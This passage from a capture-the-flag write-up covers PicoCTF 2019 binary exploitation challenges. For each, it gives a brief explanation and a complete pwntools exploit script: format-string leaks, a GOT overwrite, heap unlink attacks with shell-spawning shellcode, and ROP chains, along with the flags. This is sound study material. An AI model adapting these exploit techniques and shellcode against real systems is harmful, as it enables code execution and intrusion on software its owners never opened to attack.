s = ssh(host='2019shell1.picoctf.com', user='sashackers', password=&quot;XXX&quot;)

def start():
  global sh
  if len(argv) &lt; 2:
    stdout = process.PTY
    stdin = process.PTY

    sh = process(BINARY, stdout=stdout, stdin=stdin)

    # if DEBUG:
    #   attach_gdb()

    REMOTE = False
  else:
    sh = s.process('vuln', cwd='/problems/stringzz_2_a90e0d8339487632cecbad2e459c71c4')
    REMOTE = True

# for i in range(200):
#   start()
#   try:
#     sh.sendlineafter(':\n', '%{}$s'.format(i))
#     data = sh.recvall()
#     if 'pico' in data:
#       print data
#       exit()
#   except:
#     print 'pass'
start()

payload = '%37$s'
sh.sendlineafter(':\n', payload)
sh.interactive()
</code></pre>

<p>flag: <code>picoCTF{str1nG_CH3353_166b95b4}</code></p>

<h1 id="got">GoT</h1>

<h2 id="problem-12">Problem</h2>

<p>You can only change one address, here is the problem: program. It is also found in /problems/got_1_6a9949d39d119bd2973bdc661d78f71d on the shell server. Source.</p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/GoT/vuln">Binary</a></p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/GoT/vuln.c">Source</a></p>

<h2 id="solution-12">Solution</h2>

<p>This is a simple GOT overwrite challenge. It is the same as <a href="/blog/posts/picoctf-2018-writeup/binary-exploitation/#got-shell">got-shell?</a> from last year.</p>

<p>Exploit script:</p>

<pre><code class="language-python">from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']


def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'


if len(argv) &lt; 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  if DEBUG:
    attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password=&quot;XXX&quot;)
  sh = s.process('vuln', cwd='/problems/got_1_6a9949d39d119bd2973bdc661d78f71d')
  REMOTE = True

# $ r2 ./vuln
# [0x080484b0]&gt; aaaa
# [0x080484b0]&gt; afl~win
# 0x080485c6    3 153          sym.win
# [0x080484b0]&gt; afl~exit
# 0x08048460    1 6            sym.imp.exit
# [0x080484b0]&gt; pdf @ sym.imp.exit
# / (fcn) sym.imp.exit 6
# \           0x08048460      ff251ca00408   jmp dword [reloc.exit]      ; 0x804a01c ; &quot;f\x84\x04\bv\x84\x04\b\x86\x84\x04\b\x96\x84\x04\b&quot;

exit_got = 0x804a01c
win_addr = 0x080485c6

sh.sendlineafter('address\n', str(exit_got))
sh.sendlineafter('value?\n', str(win_addr))

sh.interactive()
</code></pre>

<p>flag: <code>picoCTF{A_s0ng_0f_1C3_and_f1r3_e122890e}</code></p>

<h1 id="pointy">pointy</h1>

<h2 id="problem-13">Problem</h2>

<p>Exploit the function pointers in this program. It is also found in /problems/pointy_1_e2b49b679521bd6d957b864c91e7b39e on the shell server. Source.</p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/pointy/vuln">Binary</a></p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/pointy/vuln.c">Source</a></p>

<h2 id="solution-13">Solution</h2>

<p>The bug in the program is that we can select professors as students and students as professors. By writing the <code>lastScore</code> of a <code>professor</code> and then treating it as a <code>student</code>, we can control the <code>scoreProfessor</code> field and retrieve the flag.</p>

<p>Exploit script:</p>

<pre><code class="language-python">from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) &lt; 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  if DEBUG:
    attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password=&quot;XXX&quot;)
  sh = s.process('vuln', cwd='/problems/pointy_1_e2b49b679521bd6d957b864c91e7b39e')
  REMOTE = True

win_addr = 0x08048696

payload = ''

send = lambda x: sh.sendlineafter('\n', x)

send('a')
send('b')
send('a')
send('b')
send(str(win_addr))

sh.sendlineafter(' student\n', 'c')
send('d')
send('b')
send('d')
send(str(0))

sh.interactive()  
</code></pre>

<p>flag: <code>picoCTF{g1v1ng_d1R3Ct10n5_16d57b6c}</code></p>

<h1 id="seed-spring">seed-sPRiNG</h1>

<h2 id="problem-14">Problem</h2>

<p>The most revolutionary game is finally available: seed sPRiNG is open right now! seed_spring. Connect to it with nc 2019shell1.picoctf.com 4160.</p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/seed-sPRiNG/seed_spring">Binary</a></p>

<h2 id="solution-14">Solution</h2>

<p>By reversing the program, we can see that our objective is to correctly guess 30 random numbers in a row:</p>

<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+0h] [ebp-18h]
  int v5; // [esp+4h] [ebp-14h]
  unsigned int seed; // [esp+8h] [ebp-10h]
  int i; // [esp+Ch] [ebp-Ch]
  int *v8; // [esp+10h] [ebp-8h]

  v8 = &amp;argc;
  puts((const char *)&amp;unk_A40);
  puts((const char *)&amp;unk_A40);
  puts(&quot;                                                                             &quot;);
  puts(&quot;                          #                mmmmm  mmmmm    \&quot;    mm   m   mmm &quot;);
  puts(&quot;  mmm    mmm    mmm    mmm#          mmm   #   \&quot;# #   \&quot;# mmm    #\&quot;m  # m\&quot;   \&quot;&quot;);
  puts(&quot; #   \&quot;  #\&quot;  #  #\&quot;  #  #\&quot; \&quot;#         #   \&quot;  #mmm#\&quot; #mmmm\&quot;   #    # #m # #   mm&quot;);
  puts(&quot;  \&quot;\&quot;\&quot;m  #\&quot;\&quot;\&quot;\&quot;  #\&quot;\&quot;\&quot;\&quot;  #   #          \&quot;\&quot;\&quot;m  #      #   \&quot;m   #    #  # # #    #&quot;);
  puts(&quot; \&quot;mmm\&quot;  \&quot;#mm\&quot;  \&quot;#mm\&quot;  \&quot;#m##         \&quot;mmm\&quot;  #      #    \&quot; mm#mm  #   ##  \&quot;mmm\&quot;&quot;);
  puts(&quot;                                                                             &quot;);
  puts((const char *)&amp;unk_A40);
  puts((const char *)&amp;unk_A40);
  puts(&quot;Welcome! The game is easy: you jump on a sPRiNG.&quot;);
  puts(&quot;How high will you fly?&quot;);
  puts((const char *)&amp;unk_A40);
  fflush(stdout);
  seed = time(0);
  srand(seed);
  for ( i = 1; i &lt;= 30; ++i )
  {
    printf(&quot;LEVEL (%d/30)\n&quot;, i);
    puts((const char *)&amp;unk_A40);
    LOBYTE(v5) = rand() &amp; 0xF;
    v5 = (unsigned __int8)v5;
    printf(&quot;Guess the height: &quot;);
    fflush(stdout);
    __isoc99_scanf(&quot;%d&quot;, &amp;v4);
    fflush(stdin);
    if ( v5 != v4 )
    {
      puts(&quot;WRONG! Sorry, better luck next time!&quot;);
      fflush(stdout);
      exit(-1);
    }
  }
  puts(&quot;Congratulation! You've won! Here is your flag:\n&quot;);
  get_flag();
  fflush(stdout);
  return 0;
}
</code></pre>

<p>We can accomplish this if we are able to determine the exact value <code>time(0)</code> returns which is the seed. This can be done in python as described <a href="https://github.com/Naetw/CTF-pwn-tips#predictable-rngrandom-number-generator">here</a>.</p>

<p>Exploit script:</p>

<pre><code class="language-python">from pwn import *
import sys
import ctypes

LIBC = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')

argv = sys.argv

DEBUG = True
BINARY = './seed_spring'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'


def start():
  global sh
  if len(argv) &lt; 2:
    stdout = process.PTY
    stdin = process.PTY

    sh = process(BINARY, stdout=stdout, stdin=stdin)

    # if DEBUG:
    #   attach_gdb()

    REMOTE = False
  else:
    sh = remote('2019shell1.picoctf.com', 4160)
    REMOTE = True

for i in range(100):

  start()
  try:
    LIBC.srand(LIBC.time(0)-i)

    for i in range(30):
      sh.sendlineafter(': ', str(LIBC.rand() &amp; 0xf))
      

    sh.interactive()
  except:
    print 'pass'
</code></pre>

<p>flag: <code>picoCTF{pseudo_random_number_generator_not_so_random_24ce919be49576c7df453a4a3e6fbd40}</code></p>

<h1 id="afterlife">AfterLife</h1>

<h2 id="problem-15">Problem</h2>

<p>Just pwn this program and get a flag. It&rsquo;s also found in /problems/afterlife_6_1c6bc56bd64007e5162e284db4d03df5 on the shell server. Source.</p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/AfterLife/vuln">Binary</a></p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/AfterLife/vuln.c">Source</a></p>

<h2 id="solution-15">Solution</h2>

<p>This is a heap overflow attack where we have a leaked heap address. A quick check with radare2 reveals that it is not using the standard <code>malloc</code> in libc:</p>

<pre><code>[0x08048850]&gt; afl~malloc
0x08049d81   16 481          sym.malloc_consolidate
0x0804ab72    7 105          sym.malloc_usable_size
0x0804937b   64 1908         sym.malloc
0x0804ad80    3 176          sym.malloc_stats
0x0804ab38    1 58           sym.malloc_trim
0x08048b7f    4 226          sym.malloc_init_state
0x0804a7ca    1 37           sym.independent_comalloc
</code></pre>

<p>The first attack that came to mind is the unlink attack. We can overwrite the <code>fd_ptr</code> and <code>bk_ptr</code> pointers of a freed chunk, so when the chunk is then malloced, <code>fd_ptr+12 = bk_ptr</code> and <code>bk_ptr+8 = fd_ptr</code>. We can utilize this to overwrite the GOT table and get code execution with something like this:</p>

<ul>
<li>exit_got-12 &lt;&ndash; fd_ptr</li>
<li>leak+8 &lt;&ndash; bk_ptr / location of our shellcode.</li>
</ul>

<p>After unlink, <code>exit_got-12+12</code> will equal <code>leak+8</code> the location where we placed our shellcode.</p>

<p>One thing to keep in mind is that 4 bytes of our shellcode would also get corrupted by the unlink, so we need to have a relative jump at the start of our shellcode:</p>

<pre><code class="language-python">payload += asm('''
  jmp sc
  {}
sc:
  nop
  '''.format('nop\n'*100)+shellcraft.i386.linux.sh())
</code></pre>

<p>Exploit script:</p>

<pre><code class="language-python">from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) &lt; 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process([BINARY, 'AAAAAAAABBBBBBBB'], stdout=stdout, stdin=stdin)

  if DEBUG:
    attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password=&quot;XXX&quot;)
  sh = s.process(['vuln', 'AAAAAAAABBBBBBBB'], cwd='/problems/afterlife_6_1c6bc56bd64007e5162e284db4d03df5')
  REMOTE = True

leak = int(sh.recvuntil('you').split('\n')[-2])

print hex(leak)

exit_got = 0x804d02c

payload = p32(exit_got-12) 
payload += p32(leak+8)
payload += asm('''
  jmp sc
  {}
sc:
  nop
  '''.format('nop\n'*100)+shellcraft.i386.linux.sh())
print enhex(payload)

assert len(payload) &lt;= 256

payload = payload.ljust(256)

sh.sendlineafter('...\n', payload)

sh.interactive()
</code></pre>

<p>flag: <code>picoCTF{what5_Aft3r_d2d97c7b}</code></p>

<h1 id="l1im1tl355">L1im1tL355</h1>

<h2 id="problem-16">Problem</h2>

<p>Just pwn this program and get a flag. Its also found in /problems/l1im1tl355_1_688adedb3c25bf76cbb2c2a0fe7e9ac3 on the shell server. Source.</p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/L1im1tL355/vuln">Binary</a></p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/L1im1tL355/vuln.c">Source</a></p>

<h2 id="solution-16">Solution</h2>

<p>Because there&rsquo;s no bound check in c arrays, we can enter negative numbers for the index. This allows us to overwrite the return address of the <code>replaceIntegerInArrayAtIndex</code> function since the stack looks something like this:</p>

<ul>
<li>lower stack address</li>
<li>replaceIntegerInArrayAtIndex: stack data</li>
<li>replaceIntegerInArrayAtIndex: saved ebp</li>
<li>replaceIntegerInArrayAtIndex: return address (-5)</li>
<li>main: other stack data</li>
<li>main: array (+0)</li>
<li>higher stack address</li>
</ul>

<p>Exploit script:</p>

<pre><code class="language-python">from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'


if len(argv) &lt; 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  if DEBUG:
    attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password=&quot;XXX&quot;)
  sh = s.process('vuln', cwd='/problems/l1im1tl355_1_688adedb3c25bf76cbb2c2a0fe7e9ac3')
  REMOTE = True

win_addr = 0x080485c6

sh.sendlineafter('array\n', str(win_addr))
sh.sendlineafter('value\n', str(-5))

sh.interactive()
</code></pre>

<p>flag: <code>picoCTF{str1nG_CH3353_59c3cf5a}</code></p>

<h1 id="secondlife">SecondLife</h1>

<h2 id="problem-17">Problem</h2>

<p>Just pwn this program using a double free and get a flag. It&rsquo;s also found in /problems/secondlife_2_ecf87473c7934afc6ea15edd2ee954ca on the shell server. Source.</p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/SecondLife/vuln">Binary</a></p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/SecondLife/vuln.c">Source</a></p>

<h2 id="solution-17">Solution</h2>

<p>This is a double-free heap exploit challenge. The unlink solution that I wrote for <a href="#afterlife">AfterLife</a> works for this challenge as well, so I just copied the same script over with minor changes.</p>

<p>Exploit script:</p>

<pre><code class="language-python">from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) &lt; 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  if DEBUG:
    attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password=&quot;XXX&quot;)
  sh = s.process('vuln', cwd='/problems/secondlife_2_ecf87473c7934afc6ea15edd2ee954ca')
  REMOTE = True

print sh.recvline()
leak = int(sh.recvline())

print hex(leak)

sh.sendline('abcde')

exit_got = 0x0804d02c

payload = p32(exit_got-12) 
payload += p32(leak+8)
payload += asm('''
  jmp sc
  {}
sc:
  nop
  '''.format('nop\n'*100)+shellcraft.i386.linux.sh())
print enhex(payload)

assert len(payload) &lt;= 256

payload = payload.ljust(256)

sh.sendlineafter('...\n', payload)

sh.interactive()
</code></pre>

<p>flag: <code>picoCTF{HeapHeapFlag_d11a9aaf}</code></p>

<h1 id="rop32">rop32</h1>

<h2 id="problem-18">Problem</h2>

<p>Can you exploit the following program to get a flag? You can find the program in /problems/rop32_3_f3a10b5fa410146f5328fb7b3e63e7c0 on the shell server. Source.</p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/rop32/vuln">Binary</a></p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/rop32/vuln.c">Source</a></p>

<h2 id="solution-18">Solution</h2>

<p>Based on the challenge name and the fact that the binary is statically compiled, we can tell that this is a pure ROP challenge where we need to get code execution:</p>

<pre><code>$ r2 ./vuln
[0x08048730]&gt; i~static
static   true
</code></pre>

<p>The hard way to approach this type of problems is to do it manually, but I prefer to do it with an automated tool which is the easy way out:</p>

<pre><code>$ ROPgadget --binary ./vuln --rop --badbytes &quot;0a&quot;
</code></pre>

<p>Running the command above produces an exploit payload that you can just copy and paste into your script.</p>

<p>Exploit script:</p>

<pre><code class="language-python">from pwn import *
import sys
import subprocess
import r2pipe

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)

if DEBUG:
  context.log_level = 'debug'

if len(argv) &lt; 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  if DEBUG:
    attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password=&quot;XXX&quot;)
  sh = s.process('vuln', cwd='/problems/rop32_3_f3a10b5fa410146f5328fb7b3e63e7c0')
  REMOTE = True


# ROPgadget --binary ./vuln --rop --badbytes &quot;0a&quot;
from struct import pack

p = 'a'*(28)
p += pack('&lt;I', 0x0806ee6b) # pop edx ; ret
p += pack('&lt;I', 0x080da060) # @ .data
p += pack('&lt;I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
p += '/bin'
p += pack('&lt;I', 0x080da060) # padding without overwrite edx
p += pack('&lt;I', 0x41414141) # padding
p += pack('&lt;I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('&lt;I', 0x0806ee6b) # pop edx ; ret
p += pack('&lt;I', 0x080da064) # @ .data + 4
p += pack('&lt;I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
p += '//sh'
p += pack('&lt;I', 0x080da064) # padding without overwrite edx
p += pack('&lt;I', 0x41414141) # padding
p += pack('&lt;I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('&lt;I', 0x0806ee6b) # pop edx ; ret
p += pack('&lt;I', 0x080da068) # @ .data + 8
p += pack('&lt;I', 0x08056420) # xor eax, eax ; ret
p += pack('&lt;I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('&lt;I', 0x080481c9) # pop ebx ; ret
p += pack('&lt;I', 0x080da060) # @ .data
p += pack('&lt;I', 0x0806ee92) # pop ecx ; pop ebx ; ret
p += pack('&lt;I', 0x080da068) # @ .data + 8
p += pack('&lt;I', 0x080da060) # padding without overwrite ebx
p += pack('&lt;I', 0x0806ee6b) # pop edx ; ret
p += pack('&lt;I', 0x080da068) # @ .data + 8
p += pack('&lt;I', 0x08056420) # xor eax, eax ; ret
p += pack('&lt;I', 0x0807c2fa) # inc eax ; ret
p += pack('&lt;I', 0x0807c2fa) # inc eax ; ret
p += pack('&lt;I', 0x0807c2fa) # inc eax ; ret
p += pack('&lt;I', 0x0807c2fa) # inc eax ; ret
p += pack('&lt;I', 0x0807c2fa) # inc eax ; ret
p += pack('&lt;I', 0x0807c2fa) # inc eax ; ret
p += pack('&lt;I', 0x0807c2fa) # inc eax ; ret
p += pack('&lt;I', 0x0807c2fa) # inc eax ; ret
p += pack('&lt;I', 0x0807c2fa) # inc eax ; ret
p += pack('&lt;I', 0x0807c2fa) # inc eax ; ret
p += pack('&lt;I', 0x0807c2fa) # inc eax ; ret
p += pack('&lt;I', 0x08049563) # int 0x80

sh.sendlineafter('?\n', p)

sh.interactive()
</code></pre>

<p>flag: <code>picoCTF{rOp_t0_b1n_sH_cb4c373e}</code></p>

<h1 id="rop64">rop64</h1>

<h2 id="problem-19">Problem</h2>

<p>Time for the classic ROP in 64-bit. Can you exploit this program to get a flag? You can find the program in /problems/rop64_5_7608f52be26a84e5625c50ba7adb22e0 on the shell server. Source.</p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/rop64/vuln">Binary</a></p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/rop64/vuln.c">Source</a></p>

<h2 id="solution-19">Solution</h2>

<p>Same approach as <a href="#rop32">rop32</a>.</p>

<p>Exploit script:</p>

<pre><code class="language-python">from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) &lt; 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  if DEBUG:
    attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password=&quot;XXX&quot;)
  sh = s.process('vuln', cwd='/problems/rop64_5_7608f52be26a84e5625c50ba7adb22e0')
  REMOTE = True


# ROPgadget --binary ./vuln --rop --badbytes &quot;0a&quot;
from struct import pack

p = 'a'*(16+8)
p += pack('&lt;Q', 0x00000000004100d3) # pop rsi ; ret
p += pack('&lt;Q', 0x00000000006b90e0) # @ .data
p += pack('&lt;Q', 0x00000000004156f4) # pop rax ; ret
p += '/bin//sh'
p += pack('&lt;Q', 0x000000000047f561) # mov qword ptr [rsi], rax ; ret
p += pack('&lt;Q', 0x00000000004100d3) # pop rsi ; ret
p += pack('&lt;Q', 0x00000000006b90e8) # @ .data + 8
p += pack('&lt;Q', 0x0000000000444c50) # xor rax, rax ; ret
p += pack('&lt;Q', 0x000000000047f561) # mov qword ptr [rsi], rax ; ret
p += pack('&lt;Q', 0x0000000000400686) # pop rdi ; ret
p += pack('&lt;Q', 0x00000000006b90e0) # @ .data
p += pack('&lt;Q', 0x00000000004100d3) # pop rsi ; ret
p += pack('&lt;Q', 0x00000000006b90e8) # @ .data + 8
p += pack('&lt;Q', 0x00000000004499b5) # pop rdx ; ret
p += pack('&lt;Q', 0x00000000006b90e8) # @ .data + 8
p += pack('&lt;Q', 0x0000000000444c50) # xor rax, rax ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x0000000000449135) # syscall ; ret

sh.sendlineafter('?\n', p)

sh.interactive()
</code></pre>

<p>flag: <code>picoCTF{rOp_t0_b1n_sH_w1tH_n3w_g4dg3t5_cfc72366}</code></p>

<h1 id="heap-overflow">Heap overflow</h1>

<h2 id="problem-20">Problem</h2>

<p>Just pwn this using a heap overflow taking advantage of douglas malloc free program and get a flag. Its also found in /problems/heap-overflow_5_39d709fdc06b81d3c23b73bb9cca6bdb on the shell server. Source.</p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/Heap overflow/vuln">Binary</a></p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/Heap overflow/vuln.c">Source</a></p>

<h2 id="solution-20">Solution</h2>

<p>Another challenge that is solved with the unlink method just like <a href="#afterlife">Afterlife</a> and <a href="#secondlife">Secondlife</a>. The difference is that this time we need a bit more finessing.</p>

<p>To make sure we trigger the unlink mechanics, we need to do two things: 1. change the size of the <code>lastname</code> chunk so it would be treated as a smallbin instead of a fastbin 2. fake a freed chunk after <code>lastname</code> that would be unlinked when merged with the <code>lastname</code> chunk.</p>

<p>The stack layout would look something like this:</p>

<ul>
<li>fullname &lt;&ndash; contains our shellcode</li>
<li>name &lt;&ndash; untouched</li>
<li>lastname &lt;&ndash; now with a size of 0x100 so it would be treated as a smallbin</li>
<li>a fake free chunk added that have the <code>fd_ptr</code> and <code>bf_ptr</code> set</li>
</ul>

<p>When lastname is freed, it will try to merge with neighboring chunks which would trigger the unlink.</p>

<p>Exploit script:</p>

<pre><code class="language-python">from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)

if DEBUG:
  context.log_level = 'debug'

if len(argv) &lt; 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  if DEBUG:
    attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password=&quot;XXX&quot;)
  sh = s.process('vuln', cwd='/problems/heap-overflow_5_39d709fdc06b81d3c23b73bb9cca6bdb')
  REMOTE = True

print sh.recvline()
leak = int(sh.recvline())

print hex(leak)

exit_got = 0x0804d02c

shellcode = 'a'*8
shellcode += asm('''
  jmp sc
  {}
sc:
  nop
  '''.format('nop\n'*100)+shellcraft.i386.linux.sh())

shellcode = shellcode.ljust(0x2a0-0x4)
shellcode += p32(0x49).ljust(0x48)
shellcode += p32(0x101)

sh.sendlineafter('fullname\n', shellcode)


fake_chunk = p32(0x101)
fake_chunk += p32(exit_got-12) 
fake_chunk += p32(leak+8)
fake_chunk = fake_chunk.ljust(0x100-0x4)+p32(0x101)

payload = 'a'*(0x100-4)+fake_chunk

sh.sendlineafter('lastname\n', payload)

sh.interactive()
</code></pre>

<p>flag: <code>picoCTF{a_s1mpl3_h3ap_69424381}</code></p>

                </section>
            </article>

            
                <a class="twitter" href="https://twitter.com/intent/tweet?text=https%3a%2f%2ftcode2k16.github.io%2fblog%2fposts%2fpicoctf-2019-writeup%2fbinary-exploitation%2f - PicoCTF%202019%20Writeup%3a%20Binary%20Exploitation by @tcode2k16"><span class="icon-twitter"> tweet</span></a>

<a class="facebook" href="#" onclick="
    window.open(
      'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
      'facebook-share-dialog',
      'width=626,height=436');
    return false;"><span class="icon-facebook-rect"> Share</span>
</a>

            

            
                <div id="disqus_thread"></div>
<script type="text/javascript">
    var disqus_shortname = 'github-blog-14'; 

     
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>

            

            

            <footer id="footer">
    
        <div id="social">

	
	
    <a class="symbol" href="https://www.github.com/tcode2k16">
        <i class="fa fa-github-square"></i>
    </a>
    
    <a class="symbol" href="https://twitter.com/tcode2k16">
